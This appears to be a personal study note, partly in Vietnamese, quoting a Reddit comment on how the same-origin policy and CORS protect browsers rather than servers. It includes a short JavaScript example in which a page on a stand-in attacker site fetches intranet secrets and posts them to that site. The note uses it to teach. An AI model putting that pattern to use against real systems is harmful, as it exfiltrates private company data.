---
share: true
created: 2023-10-30T14:29
updated: 2024-11-30T13:40
alias: same-origin policy là để trình duyệt bảo vệ người dùng, không phải để bảo vệ máy chủ
---
You are at work and you're connected to your company's intranet. Only people in your company's network can see this special website containing secret documents.

You visit this random website: [https://evil.website](https://evil.website). On this website, there is the following code:
```js
const fetchResult = await fetch("https://yourcompany.website/secret/documents");
const secretsPage = await fetchResult.text();
await fetch("https://evil.website/database/save", { method: "post", body: secretsPage });
```

Same origin policy (enabled on every browser) disallows this. You cannot be on evil.website and make a request to another website. So line 1 would throw an error and the rest of the code wouldn't run, saving you from a nasty situation.

CORS exists to loosen up this rule. Maybe yourcompany.website is totally cool with the above scenario because evil.website is their poorly named trusted partner. So yourcompany.website sets up CORS to tell the browser: "hey if you're making this request from evil.website, it's totally cool with us." Now the above code will work as expected as the browser is satisfied with this exception to the same origin policy.

In the above example, your browser was potentially being abused to exfiltrate company secrets that are only accessible from your network. Same origin policy protects **your browser** from being abused in these ways. CORS is about providing exceptions to this rule.

The misconception here is the following. People set up CORS on their webserver. That's why they expect CORS protects their web server in some way. This is 100% wrong. Setting CORS up properly is about protecting the clients (ie. browsers). The only side-effect CORS has for your webserver is that it may add a few response headers to help out the browser make a decision. The real magic happens on the browser.

Trích từ:: [What is CORS and why is it so annoying : r/reactjs](https://www.reddit.com/r/reactjs/comments/11cyejn/comment/ja77iy4/)

[How to win at CORS - JakeArchibald.com](https://jakearchibald.com/2021/cors/)
![](https://wizardzines.com/images/uploads/why-same-origin-matters.png) 
[Same-origin policy ngăn chặn việc script ở tab này điều khiển tab kia](./Same-origin%20policy%20ng%C4%83n%20ch%E1%BA%B7n%20vi%E1%BB%87c%20script%20%E1%BB%9F%20tab%20n%C3%A0y%20%C4%91i%E1%BB%81u%20khi%E1%BB%83n%20tab%20kia.md)
[Origin là sự kết hợp của protocol, hostname và port](../../../../%F0%9F%96%A5%EF%B8%8FM%E1%BA%A1ng%20m%C3%A1y%20t%C3%ADnh/T%C3%AAn%20mi%E1%BB%81n,%20URI/Origin%20l%C3%A0%20s%E1%BB%B1%20k%E1%BA%BFt%20h%E1%BB%A3p%20c%E1%BB%A7a%20protocol,%20hostname%20v%C3%A0%20port.md)
[Nếu tạo CORS proxy thì chỉ trả về đúng HTML thôi, đừng xử lý gì trên đó hết](./N%E1%BA%BFu%20t%E1%BA%A1o%20CORS%20proxy%20th%C3%AC%20ch%E1%BB%89%20tr%E1%BA%A3%20v%E1%BB%81%20%C4%91%C3%BAng%20HTML%20th%C3%B4i,%20%C4%91%E1%BB%ABng%20x%E1%BB%AD%20l%C3%BD%20g%C3%AC%20tr%C3%AAn%20%C4%91%C3%B3%20h%E1%BA%BFt.md)